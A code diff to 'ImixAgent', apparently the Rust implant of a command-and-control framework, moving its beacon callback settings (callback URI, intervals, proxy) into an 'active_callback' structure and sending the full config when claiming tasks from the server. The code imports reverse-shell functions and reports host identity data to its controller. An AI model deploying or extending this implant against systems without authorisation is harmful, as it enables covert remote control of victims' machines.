@@ -5,6 +5,7 @@ use pb::c2::{self, ClaimTasksRequest};
 use std::collections::{BTreeMap, BTreeSet};
 use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
+use transport::config::active_callback_to_transport_config;
 use transport::Transport;
 
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
@@ -29,7 +30,11 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         runtime_handle: tokio::runtime::Handle,
         task_registry: Arc<TaskRegistry>,
     ) -> Self {
-        let uri = config.callback_uri.clone();
+        let uri = config
+            .active_callback
+            .as_ref()
+            .map(|ac| ac.callback_uri.clone())
+            .unwrap_or_default();
         Self {
             config: Arc::new(RwLock::new(config)),
             transport: Arc::new(RwLock::new(transport)),
@@ -48,11 +53,11 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             .config
             .try_read()
             .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
-        let info = cfg
-            .info
+        let active_callback = cfg
+            .active_callback
             .as_ref()
-            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
-        Ok(info.interval)
+            .ok_or_else(|| anyhow::anyhow!("No active_callback in config"))?;
+        Ok(active_callback.callback_interval)
     }
 
     // Triggers config.refresh_primary_ip() in a write lock
@@ -99,7 +104,13 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         }
     }
 
-    // Helper to get active callback URI (includes all config in query params)
+    // Helper to get active callback configuration
+    pub async fn get_active_callback(&self) -> Option<pb::config::ActiveCallback> {
+        let cfg = self.config.read().await;
+        cfg.active_callback.clone()
+    }
+
+    // Helper to get active callback URI (for backwards compatibility with Eldritch)
     pub async fn get_callback_uri(&self) -> String {
         let uris = self.callback_uris.read().await;
         let idx = *self.active_uri_idx.read().await;
@@ -131,10 +142,14 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             }
         }
 
-        // 2. Create new transport from config
-        let callback_uri = self.get_callback_uri().await;
-        let config = transport::parse_transport_uri(&callback_uri)
-            .context("Failed to parse transport URI")?;
+        // 2. Create new transport from active_callback
+        let active_callback = self
+            .get_active_callback()
+            .await
+            .ok_or_else(|| anyhow::anyhow!("No active_callback configured"))?;
+
+        let config = active_callback_to_transport_config(&active_callback)
+            .context("Failed to parse active_callback")?;
         let t = T::new(config).context("Failed to create on-demand transport")?;
 
         #[cfg(debug_assertions)]
@@ -146,9 +161,16 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     // Helper to claim tasks and return them, so main can spawn
     pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
         let mut transport = self.transport.write().await;
-        let beacon_info = self.config.read().await.info.clone();
+        let cfg = self.config.read().await.clone();
+        // Convert config::Config to pb::config::Config for the request
+        let pb_config = pb::config::Config {
+            info: cfg.info.clone(),
+            active_callback: cfg.active_callback.clone(),
+            run_once: cfg.run_once,
+        };
         let req = ClaimTasksRequest {
-            beacon: beacon_info,
+            beacon: cfg.info.clone(),
+            config: Some(pb_config),
         };
         let response = transport
             .claim_tasks(req)
@@ -287,25 +309,30 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             .block_on(async { Ok(self.config.read().await.clone()) })
             .map_err(|e: String| e)?;
 
-        let active_uri = self.get_active_callback_uri().unwrap_or_default();
-        map.insert("callback_uri".to_string(), active_uri.clone());
-
-        // Parse URI to extract retry_interval and proxy_uri
-        if let Ok(config) = transport::parse_transport_uri(&active_uri) {
+        // Extract from active_callback
+        if let Some(ac) = &cfg.active_callback {
+            map.insert("callback_uri".to_string(), ac.callback_uri.clone());
+            map.insert("retry_interval".to_string(), ac.retry_interval.to_string());
             map.insert(
-                "retry_interval".to_string(),
-                config.retry_interval.to_string(),
+                "callback_interval".to_string(),
+                ac.callback_interval.to_string(),
             );
-            if let Some(proxy) = config.transport_specific.get("proxy_uri") {
-                map.insert("proxy_uri".to_string(), proxy.clone());
+
+            // Parse transport_config JSON
+            if let Ok(tc_map) = serde_json::from_str::<std::collections::HashMap<String, String>>(
+                &ac.transport_config,
+            ) {
+                if let Some(proxy) = tc_map.get("proxy_uri") {
+                    map.insert("proxy_uri".to_string(), proxy.clone());
+                }
             }
         }
+
         map.insert("run_once".to_string(), cfg.run_once.to_string());
 
         if let Some(info) = &cfg.info {
             map.insert("beacon_id".to_string(), info.identifier.clone());
             map.insert("principal".to_string(), info.principal.clone());
-            map.insert("interval".to_string(), info.interval.to_string());
             if let Some(host) = &info.host {
                 map.insert("hostname".to_string(), host.name.clone());
                 map.insert("platform".to_string(), host.platform.to_string());
@@ -362,8 +389,8 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
         self.block_on(async {
             let mut cfg = self.config.write().await;
-            if let Some(info) = &mut cfg.info {
-                info.interval = interval;
+            if let Some(ac) = &mut cfg.active_callback {
+                ac.callback_interval = interval;
             }
             Ok(())
         })
@@ -377,9 +404,26 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             if let Some(pos) = uris.iter().position(|x| *x == uri) {
                 *idx = pos;
             } else {
-                uris.push(uri);
+                uris.push(uri.clone());
                 *idx = uris.len() - 1;
             }
+
+            // Also update Config.active_callback with the new URI
+            // Parse URI to extract all config (for Eldritch runtime URI changes)
+            if let Ok(parsed) = transport::parse_transport_uri(&uri) {
+                let mut cfg = self.config.write().await;
+                if let Some(ac) = &mut cfg.active_callback {
+                    ac.callback_uri = parsed.base_uri;
+                    ac.retry_interval = parsed.retry_interval;
+                    ac.callback_interval = parsed.callback_interval;
+
+                    // Serialize transport_specific to JSON
+                    if let Ok(json) = serde_json::to_string(&parsed.transport_specific) {
+                        ac.transport_config = json;
+                    }
+                }
+            }
+
             Ok(())
         })
     }
